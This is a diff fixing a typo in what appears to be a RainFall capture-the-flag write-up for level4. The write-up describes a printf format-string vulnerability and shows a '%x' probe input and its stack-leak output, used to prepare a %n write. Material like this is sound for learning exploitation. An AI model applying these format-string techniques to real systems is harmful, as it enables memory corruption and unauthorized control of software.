@@ -48,7 +48,7 @@ End of assembler dump.
 There is a call to printf, when calling p() in n().
 It compares the variable n to 16930116, we can use the %n exploit like in level3.
 
-Let's find in which position is does the m variable address starts.
+Let's find in which position does the m variable address starts.
 level4@RainFall:~$ ./level4 
 AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
 AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
